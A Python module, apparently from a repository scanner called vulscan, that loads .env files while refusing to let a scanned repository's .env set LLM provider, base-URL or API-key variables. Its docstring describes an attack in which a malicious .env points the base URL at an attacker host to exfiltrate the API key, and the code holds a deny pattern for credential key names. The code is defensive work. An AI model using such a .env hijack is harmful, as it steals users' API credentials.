"""Scan-safe .env loading for untrusted working directories.

``vulscan scan <repo>`` runs with the scanned repository as CWD, and scanned
repositories are untrusted: a malicious repo can ship a ``.env`` that hijacks
LLM traffic, e.g. ``VULSCAN_LLM_PROVIDER=openai_compat`` together with
``VULSCAN_LLM_BASE_URL=https://attacker.tld`` so the API key is exfiltrated
via the Authorization header.

``load_scan_safe_dotenv()`` therefore never injects provider/credential keys
from the CWD ``.env``; only the user-owned ``~/.config/vulscan/.env`` is
loaded in full.
"""

from __future__ import annotations

import os
import re

from dotenv import load_dotenv

from utilities.file_io import open_utf8

# Keys a scanned repository must never control: provider selection / base URL
# and anything that looks like an API credential. Case-insensitive because
# os.environ keys are normalized to uppercase on Windows.
_SENSITIVE_KEY_RE = re.compile(
    r"^(?:VULSCAN_LLM_.*|ANTHROPIC_.*|OPENAI_.*|DEEPSEEK_.*|DASHSCOPE_.*"
    r"|.*_API_KEY|.*_API_SECRET)$",
    re.IGNORECASE,
)

_SIMPLE_ENV_LINE_RE = re.compile(r"^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)$")


def _user_config_dir() -> str:
    return os.path.join(os.path.expanduser("~"), ".config", "vulscan")


def _is_within(path: str, directory: str) -> bool:
    try:
        return os.path.commonpath([os.path.realpath(path), os.path.realpath(directory)]) == os.path.realpath(
            directory
        )
    except (OSError, ValueError):
        return False


def _parse_env_file_fallback(path: str) -> dict[str, str]:
    """Conservative KEY=VALUE parser used only when ``dotenv.dotenv_values``
    is unavailable (e.g. a stubbed dotenv module). Lines that do not match the
    simple ``KEY=VALUE`` form are skipped (fail-closed: nothing is injected).
    """
    values: dict[str, str] = {}
    with open_utf8(path, errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            match = _SIMPLE_ENV_LINE_RE.match(line)
            if not match:
                continue
            key, value = match.group(1), match.group(2).strip()
            if len(value) >= 2 and value[0] == value[-1] and value[0] in ("'", '"'):
                value = value[1:-1]
            values[key] = value
    return values


def _parse_env_file(path: str) -> dict[str, str | None]:
    import dotenv

    dotenv_values = getattr(dotenv, "dotenv_values", None)
    if dotenv_values is not None:
        return dict(dotenv_values(path))
    return _parse_env_file_fallback(path)


def load_scan_safe_dotenv() -> None:
    """Load .env files without letting an untrusted CWD inject secrets.

    * ``~/.config/vulscan/.env`` (user-owned) is always loaded in full when
      present.
    * ``<CWD>/.env`` is loaded in full only when it lives under
      ``~/.config/vulscan/``; otherwise keys matching ``VULSCAN_LLM_*``,
      ``ANTHROPIC_*``, ``OPENAI_*``, ``DEEPSEEK_*``, ``DASHSCOPE_*``,
      ``*_API_KEY`` and ``*_API_SECRET`` are skipped.

    Existing ``os.environ`` values are never overwritten (same default as
    ``dotenv.load_dotenv``).
    """
    config_dir = _user_config_dir()
    config_env = os.path.join(config_dir, ".env")
    if os.path.isfile(config_env):
        load_dotenv(config_env)  # override=False by default

    cwd_env = os.path.join(os.getcwd(), ".env")
    if not os.path.isfile(cwd_env):
        return
    if _is_within(cwd_env, config_dir):
        return  # user config dir — already fully loaded above
    for key, value in _parse_env_file(cwd_env).items():
        if value is None or key in os.environ:
            continue
        if _SENSITIVE_KEY_RE.match(key):
            continue
        os.environ[key] = value
